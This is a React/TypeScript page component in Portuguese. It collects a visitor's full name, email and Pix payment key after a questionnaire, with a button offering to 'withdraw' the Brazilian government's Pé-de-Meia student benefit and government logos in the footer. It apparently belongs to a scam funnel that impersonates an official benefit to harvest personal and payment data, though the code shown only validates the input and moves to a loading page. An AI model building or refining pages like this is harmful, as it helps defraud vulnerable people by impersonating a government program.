import atendente from '../../images/atendente.png';
import { useState } from "react";
import { useNavigateWithParams } from "../../hooks/useNavigateWithParams";
import gov1 from '../../images/gov1.png';
import gov2 from '../../images/gov2.png';

function GetInfos() {
    const [nome, setNome] = useState("");
    const [email, setEmail] = useState("");
    const [pix, setPix] = useState("");
    const [pixType, setPixType] = useState<"phone" | "email" | "random" | "unknown">("unknown");
    const [pixError, setPixError] = useState("");

    const navigate = useNavigateWithParams();

    function handleContinuar() {
        if (!nome.trim() || !email.trim() || !pix.trim()) {
            alert("Preencha todos os campos");
            return;
        }

        // Validations before continuing
        if (pixType === "phone") {
            const digits = pix.replace(/\D/g, "");
            if (digits.length < 10) {
                setPixError("Telefone inválido");
                return;
            }
        } else if (pixType === "email") {
            if (!validateEmail(pix)) {
                setPixError("Email inválido");
                return;
            }
        } else if (pixType === "random") {
            if (!validateRandomKey(pix)) {
                setPixError("Chave aleatória inválida");
                return;
            }
        } else {
            setPixError("Chave Pix inválida");
            return;
        }

        navigate("/loading");

    }

    function detectPixType(value: string) {
        const v = value.trim();
        if (!v) return "unknown" as const;
        if (v.includes("@")) return "email" as const;
        const digits = v.replace(/\D/g, "");
        // if mostly digits and length looks like phone
        if (/^\+?\d[\d\s\-().]{8,}$/.test(v) && digits.length >= 10 && digits.length <= 13) return "phone" as const;
        // UUID-ish (36 chars with hyphens) or base64-like long keys
        if (/^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(v) || v.length >= 20) return "random" as const;
        return "unknown" as const;
    }

    function formatPhone(value: string) {
        const d = value.replace(/\D/g, "");
        // handle brazilian 11-digit (2-digit DDD + 9 + 8 digits) or 10-digit
        if (d.length <= 2) return d;
        if (d.length <= 6) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
        if (d.length <= 10) return `(${d.slice(0, 2)}) ${d.slice(2, 6)}-${d.slice(6)}`;
        // 11 or more
        return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7, 11)}`;
    }

    function validateEmail(v: string) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
    }

    function validateRandomKey(v: string) {
        const trimmed = v.trim();
        // accept UUID or reasonably long keys
        if (/^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(trimmed)) return true;
        if (trimmed.length >= 20) return true;
        return false;
    }
    return (
        <main className="flex flex-col min-h-screen p-4">
            <div className="flex flex-col items-center justify-center bg-[var(--azul-claro)] h-40
        w-40 border-8 border-[var(--azul-escuro)] rounded-full mx-auto mt-7">
                <img src={atendente} alt="Foto Atendente" className="w-30 mt-1" />
            </div>

            <div
                id="messageShadow"
                className="border-1 border-black w-[90%] rounded-2xl absolute top-46 mx-auto left-1/2 
        -translate-x-1/2 px-4 py-2 bg-white"
            >
                <h1 className="text-center font-medium">
                    Que bom que concluiu nosso questionário! <br />
                    Você está quase lá.
                </h1>
            </div>

            <form
                className="mt-19 px-4"
                onSubmit={(e) => {
                    e.preventDefault();
                    handleContinuar();
                }}
            >
                <div className="flex flex-col items-center justify-center mt-6 mb-4">
                    <h2 className="text-xl font-bold mb-4">Preencha seus dados</h2>

                    <div className="w-full max-w-md">
                        <label className="block text-sm font-medium mb-1">
                            Nome Completo
                        </label>
                        <input
                            type="text"
                            value={nome}
                            onChange={(e) => setNome(e.target.value)}
                            className="w-full px-3 py-2 border rounded-md"
                        />
                    </div>

                    <div className="w-full max-w-md mt-4">
                        <label className="block text-sm font-medium mb-1">
                            Email
                        </label>
                        <input
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="w-full px-3 py-2 border rounded-md"
                        />
                    </div>

                    <div className="w-full max-w-md mt-4">
                        <label className="block text-sm font-medium mb-1">
                            Chave Pix
                        </label>
                        <input
                            type="text"
                            value={pix}
                            onChange={(e) => {
                                const v = e.target.value;
                                setPix(v);
                                const t = detectPixType(v);
                                setPixType(t);
                                setPixError("");
                            }}
                            onBlur={() => {
                                if (pixType === "phone") {
                                    setPix(formatPhone(pix));
                                } else if (pixType === "email") {
                                    setPix(pix.trim().toLowerCase());
                                }
                            }}
                            placeholder="Telefone, email ou chave aleatória"
                            className="w-full px-3 py-2 border rounded-md"
                        />
                        <p className="text-sm text-gray-500 mt-1">Tipo detectado: {pixType}</p>
                        {pixError && <p className="text-sm text-red-600 mt-1">{pixError}</p>}
                    </div>

                    <button
                        type="submit"
                        id="btnSacar"
                        className="font-semibold mt-6 text-[20px] bg-[var(--azul-escuro)] text-white py-2 px-4 rounded-md"
                    >
                        Sacar pé de meia
                    </button>
                </div>
            </form>
            <footer className="bg-[var(--azul-footer)] flex py-3 justify-center gap-20 mt-auto">
                <img src={gov1} alt="Gov1" className="w-20 object-contain" />
                <img src={gov2} alt="Gov2" className="w-20 object-contain" />
            </footer>
        </main>
    );
}

export default GetInfos;
